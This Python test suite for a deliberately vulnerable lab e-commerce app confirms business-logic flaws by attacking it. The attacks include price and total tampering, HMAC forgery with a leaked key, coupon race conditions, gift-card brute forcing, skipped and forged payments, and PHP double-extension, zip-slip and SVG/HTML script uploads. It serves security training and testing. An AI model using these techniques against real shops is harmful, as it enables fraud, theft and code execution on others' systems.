"""WSTG probes for machine 08 - Business Logic (WSTG-BUSL-01..11).

Each probe asserts that the intentional business-logic flaw is demonstrably
present in the AcmeShop purchase flow. Every probe resets shared lab state
first (POST /lab/reset + pay /reset) so the suite is idempotent across runs.
Stdlib only.
"""
import hashlib
import hmac
import io
import re
import zipfile
from concurrent.futures import ThreadPoolExecutor

from labhttp import get, post

PW = "Password123!"


# ---------------------------------------------------------------- helpers

def _reset(ctx):
    post(ctx.url("/lab/reset"))
    post(ctx.url("pay") + "/reset", data={})


def _login(ctx, username):
    s = ctx.session()
    r = s.post("/login", data={"username": username, "password": PW})
    assert r.status == 200, f"login {username} -> {r.status}"
    return s


def _register(ctx, username):
    s = ctx.session()
    r = s.post("/register", data={"username": username, "password": PW})
    assert r.status == 200, f"register {username} -> {r.status} {r.text}"
    return s


def _state(ctx):
    return get(ctx.url("/lab/state")).json()


def _multipart(filename, content, declared_type):
    boundary = "----wstgm08boundary7e51"
    head = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: {declared_type}\r\n\r\n").encode()
    body = head + content + f"\r\n--{boundary}--\r\n".encode()
    return body, {"Content-Type": f"multipart/form-data; boundary={boundary}"}


def _pay(ctx, s, oid, amount=None):
    """Legitimate mock-PSP flow: create intent -> charge test card -> callback."""
    body = {"order_id": oid}
    if amount is not None:
        body["amount"] = amount
    r = s.post("/payment/create", data=body)
    assert r.status in (200, 201), f"payment/create -> {r.status} {r.text}"
    iid = r.json()["intent_id"]
    pr = post(ctx.url("pay") + f"/intents/{iid}/pay", data={})
    assert pr.status == 200, f"intent pay -> {pr.status}"
    cb = s.post("/payment/callback",
                data={"order_id": oid, "intent_id": iid, "status": "succeeded"})
    return iid, cb


# ---------------------------------------------------------------- probes

def busl_01(ctx):
    """Negative quantity -> negative total -> 'paid' as credit; 1e9 qty accepted."""
    _reset(ctx)
    s = _login(ctx, "alice")
    r = s.post("/cart/add", data={"product_id": 1, "quantity": -2})
    neg_ok = r.status == 200 and r.json()["line_total"] == -20.0
    co = s.post("/checkout", data={"shipping": 0})
    total = co.json()["total"]
    cf = s.post("/checkout/confirm", data={"order_id": co.json()["order_id"]})
    balance = cf.json().get("balance")
    huge = s.post("/cart/add", data={"product_id": 2, "quantity": 1000000000})
    st = _state(ctx)
    gadget = next(p for p in st["products"] if p["id"] == 2)
    ok = (neg_ok and co.status == 201 and total == -20.0 and cf.status == 200
          and balance == 120.0 and huge.status == 200
          and gadget["reserved"] == 1000000000 and gadget["stock"] == 10)
    return ok, (f"qty=-2 accepted, order total={total}, confirm credited balance to {balance}; "
                f"qty=1e9 accepted against stock {gadget['stock']} (reserved={gadget['reserved']})")


def busl_02(ctx):
    """Forge unit_price/total in checkout: buy the 500.00 Gadget Pro for 0.01."""
    _reset(ctx)
    s = _login(ctx, "alice")
    s.post("/cart/add", data={"product_id": 2, "quantity": 1})
    co = s.post("/checkout", data={
        "lines": [{"product_id": 2, "quantity": 1, "unit_price": 0.01}],
        "shipping": 0, "total": 0.01})
    oid = co.json()["order_id"]
    _, cb = _pay(ctx, s, oid)
    o = s.get(f"/order/{oid}").json()
    catalog = next(p for p in _state(ctx)["products"] if p["id"] == 2)
    ok = (co.status == 201 and cb.status == 200 and o["status"] == "paid"
          and o["total"] == 0.01 and o["items"][0]["unit_price"] == 0.01
          and catalog["price"] == 500.0)
    return ok, (f"forged unit_price=0.01/total=0.01 accepted; order {oid} status={o['status']} "
                f"total={o['total']} for catalogue price {catalog['price']}")


def busl_03(ctx):
    """HMAC key leaked in JS + signature covers only order id: rewrite a PAID order."""
    _reset(ctx)
    s = _login(ctx, "alice")
    s.post("/cart/add", data={"product_id": 1, "quantity": 1})
    co = s.post("/checkout", data={"shipping": 0})
    oid, integrity = co.json()["order_id"], co.json()["integrity"]
    _pay(ctx, s, oid)  # order is now genuinely paid at 10.00
    js = get(ctx.url("/static/checkout.js")).text
    key = re.search(r"INTEGRITY_KEY = '([^']+)'", js).group(1).encode()
    forged = hmac.new(key, str(oid).encode(), hashlib.sha256).hexdigest()
    key_leak = forged == integrity
    up = s.post("/order/update", data={
        "order_id": oid, "integrity": forged, "total": 0,
        "lines": [{"product_id": 2, "name": "Gadget Pro", "quantity": 10, "unit_price": 0}]})
    o = s.get(f"/order/{oid}").json()
    ok = (key_leak and up.status == 200 and o["status"] == "paid" and o["total"] == 0.0
          and len(o["items"]) == 1 and o["items"][0]["quantity"] == 10
          and o["items"][0]["product_id"] == 2)
    return ok, (f"key leaked in checkout.js (HMAC over id only matches={key_leak}); "
                f"paid order {oid} rewritten to 10x Gadget Pro, total={o['total']}, still paid")


def busl_04(ctx):
    """Parallel redemption of a single-use coupon + client-clock flash sale."""
    _reset(ctx)
    sa, sb = _login(ctx, "alice"), _login(ctx, "bob")
    sa.post("/cart/add", data={"product_id": 1, "quantity": 1})
    sb.post("/cart/add", data={"product_id": 1, "quantity": 1})
    with ThreadPoolExecutor(max_workers=2) as ex:
        fa = ex.submit(sa.post, "/cart/coupon", {"code": "ONCE50"})
        fb = ex.submit(sb.post, "/cart/coupon", {"code": "ONCE50"})
        ra, rb = fa.result(), fb.result()
    st = _state(ctx)
    once = next(c for c in st["coupons"] if c["code"] == "ONCE50")
    reds = [r for r in st["redemptions"] if r["code"] == "ONCE50"]
    race_ok = ra.status == 200 and rb.status == 200 and once["uses"] == 2 and len(reds) == 2

    # time-window flaw: flash sale ended 2025-01-02, server clock is far past it
    s3 = _login(ctx, "alice")
    s3.post("/cart/clear")
    s3.post("/cart/add", data={"product_id": 4, "quantity": 1})
    co = s3.post("/checkout", data={"shipping": 0, "purchase_time": "2025-01-01T12:00:00"})
    flash_price = co.json()["items"][0]["unit_price"]
    s3.post("/cart/clear")
    s3.post("/cart/add", data={"product_id": 4, "quantity": 1})
    co2 = s3.post("/checkout", data={"shipping": 0})
    normal_price = co2.json()["items"][0]["unit_price"]
    st = _state(ctx)
    window_ok = (flash_price == 9.99 and normal_price == 999.0
                 and st["server_time"] > st["flash_window"][1])
    ok = race_ok and window_ok
    return ok, (f"parallel ONCE50: both HTTP {ra.status}/{rb.status}, uses={once['uses']}/max {once['max_uses']}, "
                f"redemptions={len(reds)}; expired flash sale: client time -> {flash_price} vs server clock -> {normal_price}")


def busl_05(ctx):
    """'One per customer' promo enforced per-session: same account, new cookie jar."""
    _reset(ctx)
    s1 = _login(ctx, "alice")
    s1.post("/cart/add", data={"product_id": 1, "quantity": 1})
    r1 = s1.post("/cart/coupon", data={"code": "WELCOME5"})
    s2 = _login(ctx, "alice")  # same account, brand-new session
    s2.post("/cart/add", data={"product_id": 1, "quantity": 1})
    r2 = s2.post("/cart/coupon", data={"code": "WELCOME5"})
    st = _state(ctx)
    alice = next(u for u in st["users"] if u["username"] == "alice")
    reds = [r for r in st["redemptions"] if r["code"] == "WELCOME5" and r["user_id"] == alice["id"]]
    ok = r1.status == 200 and r2.status == 200 and len(reds) == 2
    return ok, (f"WELCOME5 'one per customer': same account redeemed {len(reds)}x "
                f"(session1={r1.status}, fresh session2={r2.status})")


def busl_06(ctx):
    """Skip payment: confirm an unpaid order; ship unpaid/nonexistent orders."""
    _reset(ctx)
    s = _login(ctx, "alice")
    s.post("/cart/add", data={"product_id": 1, "quantity": 1})
    o1 = s.post("/checkout", data={"shipping": 0}).json()["order_id"]
    cf = s.post("/checkout/confirm", data={"order_id": o1})  # no payment ever made
    paid_no_payment = cf.status == 200 and cf.json()["status"] == "paid"
    intents = get(ctx.url("pay") + "/intents").json()["intents"]
    no_intent = not any(i["order_ref"] == o1 for i in intents)

    s.post("/cart/add", data={"product_id": 1, "quantity": 1})
    o2 = s.post("/checkout", data={"shipping": 0}).json()["order_id"]
    sh = s.post("/order/ship", data={"order_id": o2})  # order still 'pending'
    o2state = s.get(f"/order/{o2}").json()["status"]
    ghost = s.post("/order/ship", data={"order_id": 999999})  # no such order
    ok = (paid_no_payment and no_intent and sh.status == 200 and o2state == "pending"
          and ghost.status == 200 and ghost.json()["status"] == "shipped")
    return ok, (f"order {o1} confirmed 'paid' with zero payment intents={no_intent}; "
                f"order {o2} shipped while status={o2state}; nonexistent order 999999 shipped={ghost.status}")


def busl_07(ctx):
    """No rate limit / lockout: enumerate 300 gift-card codes, redeem the hit."""
    _reset(ctx)
    s = _register(ctx, "mallory")
    codes, hits, blocked = [], [], 0
    for i in range(1000, 1300):
        code = f"GC-{i}"
        r = s.post("/giftcard/redeem", data={"code": code})
        codes.append(r.status)
        if r.status == 200:
            hits.append(code)
        if r.status in (429, 403) or "locked" in r.text.lower():
            blocked += 1
    st = _state(ctx)
    mallory = next(u for u in st["users"] if u["username"] == "mallory")
    ok = (len(codes) == 300 and blocked == 0 and hits == ["GC-1234"]
          and mallory["balance"] == 150.0)
    return ok, (f"300 redemption attempts, 0 rate-limited/blocked; found {hits}; "
                f"balance 100 -> {mallory['balance']}")


def busl_08(ctx):
    """Blacklist/client-side-only upload filter: PHP double extension executes."""
    _reset(ctx)
    s = _login(ctx, "alice")
    media = ctx.url("media")
    body, hdr = _multipart("probe.php.jpg", b"<?php echo 'PWNED-'.(6*7); ?>", "image/jpeg")
    up = s.post("/account/avatar", data=body, headers=hdr)
    served = get(media + "/probe.php.jpg")
    executed = "PWNED-42" in served.text and "<?php" not in served.text
    body, hdr = _multipart("page.html", b"<html><script>document.title='stored-xss'</script></html>",
                           "image/png")
    up2 = s.post("/account/avatar", data=body, headers=hdr)
    html = get(media + "/page.html")
    body, hdr = _multipart("UP.HTML", b"<html><body>uppercase variant</body></html>", "image/png")
    up3 = s.post("/account/avatar", data=body, headers=hdr)
    ok = (up.status == 201 and up2.status == 201 and up3.status == 201 and executed
          and "text/html" in html.header("Content-Type", "")
          and "<script>" in html.text)
    return ok, (f"probe.php.jpg (declared image/jpeg) stored={up.status} and EXECUTED "
                f"(body contains PWNED-42={executed}); page.html served as "
                f"{html.header('Content-Type')}; UP.HTML stored={up3.status}")


def busl_09(ctx):
    """Zip-slip escapes the import dir into the web root and executes; SVG script."""
    _reset(ctx)
    s = _login(ctx, "alice")
    media = ctx.url("media")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("normal.txt", "benign product image list")
        z.writestr("../../pwned.php", "<?php echo 'ZIPSLIP-'.strtoupper('ok'); ?>")
    body, hdr = _multipart("import.zip", buf.getvalue(), "application/zip")
    imp = s.post("/products/import", data=body, headers=hdr)
    iid = imp.json()["import_id"]
    escaped = get(media + "/pwned.php")          # web root, OUTSIDE imports/<id>/
    inside = get(media + f"/imports/{iid}/pwned.php")
    benign = get(media + f"/imports/{iid}/normal.txt")
    slip_ok = (imp.status == 201 and "ZIPSLIP-OK" in escaped.text
               and inside.status == 404 and benign.status == 200)
    svg = (b'<svg xmlns="http://www.w3.org/2000/svg">'
           b"<script>alert(document.domain)</script></svg>")
    body, hdr = _multipart("evil.svg", svg, "image/svg+xml")
    up = s.post("/account/avatar", data=body, headers=hdr)
    served = get(media + "/evil.svg")
    svg_ok = (up.status == 201 and "image/svg+xml" in served.header("Content-Type", "")
              and "<script>" in served.text)
    ok = slip_ok and svg_ok
    return ok, (f"zip entry ../../pwned.php escaped imports/{iid}/ -> web root and executed "
                f"(ZIPSLIP-OK={('ZIPSLIP-OK' in escaped.text)}, inside-dir copy 404={inside.status == 404}); "
                f"script-bearing SVG served inline as {served.header('Content-Type')}")


def busl_10(ctx):
    """Client-set intent amount, unverified callback, negative refund."""
    _reset(ctx)
    s = _login(ctx, "alice")
    s.post("/cart/add", data={"product_id": 2, "quantity": 1})
    o1 = s.post("/checkout", data={"shipping": 0}).json()  # honest total 500.00
    iid, cb = _pay(ctx, s, o1["order_id"], amount=0.01)     # settle for 0.01
    intent = get(ctx.url("pay") + f"/intents/{iid}").json()
    order = s.get(f"/order/{o1['order_id']}").json()
    underpay = (o1["total"] == 500.0 and intent["amount"] == 0.01
                and cb.status == 200 and order["status"] == "paid")
    rf = s.post("/order/refund", data={"order_id": o1["order_id"], "amount": -25})
    credit = rf.status == 200 and rf.json()["balance"] == 125.0
    # forged callback for a nonexistent intent on a second unpaid order
    s.post("/cart/add", data={"product_id": 2, "quantity": 1})
    o2 = s.post("/checkout", data={"shipping": 0}).json()["order_id"]
    forged = s.post("/payment/callback",
                    data={"order_id": o2, "intent_id": "pi_does_not_exist", "status": "succeeded"})
    o2state = s.get(f"/order/{o2}").json()["status"]
    ok = underpay and credit and forged.status == 200 and o2state == "paid"
    return ok, (f"500.00 order settled with intent amount={intent['amount']} -> paid; "
                f"negative refund -25 credited balance to {rf.json()['balance']}; "
                f"forged callback (nonexistent intent) marked order {o2} '{o2state}'")


def busl_11(ctx):
    """Unbounded, never-expiring cart reservations lock out a legitimate buyer."""
    _reset(ctx)
    atk = _register(ctx, "attacker")
    hold = atk.post("/cart/add", data={"product_id": 3, "quantity": 3})  # all 3 units
    bob = _login(ctx, "bob")
    bob.post("/cart/add", data={"product_id": 3, "quantity": 1})
    buy = bob.post("/checkout", data={"shipping": 0})
    sweep = post(ctx.url("/lab/sweep"))
    st = _state(ctx)
    sneaker = next(p for p in st["products"] if p["id"] == 3)
    reservations = [r for r in st["reservations"] if r["product_id"] == 3]
    no_expiry = all(r["expires_at"] is None for r in reservations)
    buy2 = bob.post("/checkout", data={"shipping": 0})
    ok = (hold.status == 200 and buy.status == 409 and buy2.status == 409
          and sweep.json()["released"] == 0 and no_expiry and sneaker["available"] <= 0
          and sneaker["stock"] == 3)
    return ok, (f"attacker reserved all 3 units without paying; legitimate checkout -> "
                f"{buy.status} '{buy.json().get('error')}' (still {buy2.status} after expiry sweep "
                f"released={sweep.json()['released']}, expires_at all NULL={no_expiry}); "
                f"stock intact={sneaker['stock']}, available={sneaker['available']}")